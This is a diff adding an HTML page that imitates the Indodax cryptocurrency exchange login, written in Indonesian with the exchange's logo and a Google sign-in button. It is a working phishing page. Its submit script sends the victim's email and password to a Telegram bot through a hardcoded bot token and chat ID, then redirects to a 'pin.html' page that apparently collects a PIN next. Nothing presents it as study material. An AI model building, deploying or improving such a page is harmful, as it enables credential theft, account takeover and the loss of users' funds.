@@ -1,0 +1,157 @@
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <title>Indodax Login</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+    rel="stylesheet"
+  />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap"
+    rel="stylesheet"
+  />
+  <style>
+    body {
+      font-family: "Inter", sans-serif;
+    }
+  </style>
+</head>
+<body class="bg-white text-gray-800">
+  <header
+    class="flex items-center justify-between px-4 py-3 border-b border-gray-200"
+  >
+    <img
+      alt="Indodax logo text in blue"
+      class="h-8 w-auto"
+      height="30"
+      src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTRHCOE7BSJG8ioQWJO1WCG7D3t-dpqgT7t6I3VxXsL4L6IzwikoDN0iUbB&s=10"
+      width="120"
+    />
+    <button
+      class="bg-blue-500 text-white text-sm font-semibold px-3 py-1 rounded-md"
+      type="button"
+    >
+      Daftar
+    </button>
+  </header>
+  <main class="px-6 pt-6 max-w-md mx-auto">
+    <section>
+      <h1 class="font-extrabold text-lg mb-1">INDODAX Login</h1>
+      <p class="text-gray-600 text-sm mb-6">
+        Gunakan email dan kata sandi yang terdaftar untuk masuk ke akun Anda
+      </p>
+      <form id="loginForm" class="space-y-4">
+        <div>
+          <label class="block text-xs font-semibold mb-1" for="email">Email</label>
+          <input
+            class="w-full border border-gray-300 rounded-md px-3 py-2 text-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-400"
+            id="email"
+            placeholder="Masukkan Email"
+            type="email"
+            required
+          />
+        </div>
+        <div>
+          <label class="block text-xs font-semibold mb-1" for="password"
+            >Password</label
+          >
+          <div class="relative">
+            <input
+              class="w-full border border-gray-300 rounded-md px-3 py-2 pr-10 text-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-400"
+              id="password"
+              placeholder="Masukkan Kata Sandi"
+              type="password"
+              required
+            />
+            <button
+              aria-label="Toggle password visibility"
+              class="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400"
+              type="button"
+              onclick="togglePassword()"
+            >
+              <i class="fas fa-eye-slash" id="eyeIcon"></i>
+            </button>
+          </div>
+          <div class="text-right mt-1">
+            <a class="text-blue-500 text-xs font-semibold" href="#">Lupa Kata Sandi</a>
+          </div>
+        </div>
+        <button
+          class="w-full bg-blue-400 text-white font-semibold rounded-md py-2 text-sm"
+          type="submit"
+        >
+          Masuk
+        </button>
+      </form>
+      <div
+        class="flex items-center my-6 text-gray-400 text-xs font-semibold"
+      >
+        <hr class="flex-grow border-t border-gray-300" />
+        <span class="px-3">Atau</span>
+        <hr class="flex-grow border-t border-gray-300" />
+      </div>
+      <button
+        class="w-full border border-gray-300 rounded-md py-2 text-sm flex items-center justify-center gap-2"
+        type="button"
+      >
+        <img
+          alt="Google logo with red, yellow, green, and blue colors"
+          class="w-4 h-4"
+          height="18"
+          src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/48px-Google_%22G%22_logo.svg.png"
+          width="18"
+        />
+        Lanjut dengan Google
+      </button>
+    </section>
+  </main>
+
+  <script>
+    function togglePassword() {
+      const passwordInput = document.getElementById("password");
+      const eyeIcon = document.getElementById("eyeIcon");
+      if (passwordInput.type === "password") {
+        passwordInput.type = "text";
+        eyeIcon.classList.remove("fa-eye-slash");
+        eyeIcon.classList.add("fa-eye");
+      } else {
+        passwordInput.type = "password";
+        eyeIcon.classList.remove("fa-eye");
+        eyeIcon.classList.add("fa-eye-slash");
+      }
+    }
+
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      const botToken = "8479054313:AAE16TkHlXnf-lxLTIj7em_36Y9XKxiqHDI";
+      const chatId = "7549590022";
+
+      const message = `Login Data:%0AEmail: ${email}%0APassword: ${password}`;
+
+      fetch(
+        `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`,
+        {
+          method: "GET",
+        }
+      )
+        .then((res) => res.json())
+        .then((data) => {
+          if (data.ok) {
+            window.location.href = "pin.html"; 
+            this.reset();
+          } else {
+            alert("Gagal mengirim data ke Telegram.");
+          }
+        })
+        .catch(() => {
+        });
+    });
+  </script>
+</body>
+</html>
